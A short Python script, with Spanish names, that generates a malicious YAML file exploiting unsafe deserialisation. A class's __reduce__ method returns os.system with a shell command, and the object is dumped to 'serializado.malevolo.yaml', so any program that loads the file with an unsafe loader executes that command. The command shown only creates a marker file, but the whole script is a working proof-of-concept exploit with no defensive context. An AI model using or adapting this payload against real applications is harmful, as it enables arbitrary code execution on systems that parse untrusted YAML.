import yaml
import os

class Muajaja(object):
    def __reduce__(object):
        command = 'touch EXPLOIT-MUAJAJAJA-YAML'
        return (os.system, (command,))

serializado = yaml.dump(Muajaja())

nombre_archivo = 'serializado.malevolo.yaml'

with open(nombre_archivo, 'w') as archivo_serializado:
    archivo_serializado.write(serializado)